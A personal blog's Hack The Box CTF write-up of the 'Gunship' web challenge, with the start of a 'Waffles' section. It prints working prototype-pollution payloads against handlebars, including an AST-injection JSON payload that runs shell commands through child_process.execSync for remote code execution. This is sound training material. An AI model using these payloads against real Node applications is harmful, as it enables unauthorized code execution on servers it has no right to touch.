---
permalink: /portfolio/android/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
title: HTB CTF
---

## Gunship

Gunship is an easy web challenge with one-star difficulty. It is a simple website that asks you for a name of a band member you like best and then responds with `Hello guest, thank you for letting us know!`. After throwing some tests at it, we started looking through the code. There we found this:

```js
// unflatten seems outdated and a bit vulnerable to prototype pollution
// we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines
```

Ah! This application is vulnerable for AST injection! And apparently some po6ix is able to pwn this. After a quick google we found the page of this po6ix and he has a nice blog post about AST injection. ([source](https://blog.p6.is/AST-Injection/)) AST pollution is a where you can abuse JavaScript's prototype system to write into the memory. Basically, JS's prototyping is setting a default static value to an object, with is always read first. So being able to write into objects is a very good way to exploit an application.

There first tested payload is:

```json
{
  "artist.__proto__.name": "Westaway"
}
```

This sets the the name value of artist to always be "Westaway", this way we will always get a reply via `handebars`, which is vulnerable for AST pollution. So let's exploit the `handlebars`

```json
{
"__proto__.pendingContent": "test"
}
```

![response](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/response.png)

This replaces every reply made with handlebars with "test". This is a very good way to get data out of the application. After that we can see how we exploit this system. As we look further to po6ix's blog, there is an RCE in handlebars. The blog shows that this payload can lead to an RCE:

```json
"__proto__.type": "Program",
"__proto__.body": [{
  "type": "MustacheStatement",
  "path": 0,
  "params": [{
    "type": "NumberLiteral",
    "value": "process.mainModule.require('child_process').execSync('id')"
  }],
  "loc": {
    "start": 0,
    "end": 0
  }
}]
```

The `type` states that the body is a Program, or something to execute. Then the value of the parameter is executed. In this case it just runs `id` in the shell. We cannot read the value of this, because it is not written any where. For that we edit the `value` to:

```json
"value": "Object.prototype.pendingContent = process.mainModule.require('child_process').execSync('id').toString()"
```

![result](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/result.png)

Alright, now we have an RCE, but it seems that we cannot execute more then one command, because the system will not accept a second command. But, we can reset the machine and we only need one command.

From the `entrypoint.sh` we know where the flag is and that it starts with `flag` and then 5 random characters. So we want to read all files with starting with flag.

```bash
# Generate random flag filename
FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
mv /app/flag /app/flag$FLAG
```

So my payload is this:

![payload](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/payload.png)

![flag](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/flag.png)

We execute the payload to read all files starting with flag and then we write it into the pendingContent. The second response uses handlebars, so the pendingContent is also send. With gives us the flag!

HTB{wh3n_l1f3_g1v3s_y0u_p6_st4rt_p0llut1ng_w1th_styl3}

## Waffles

The second challenge I worked on was waffles, this was a more difficult web challenge. A PHP website where you can order a waffle or icecream.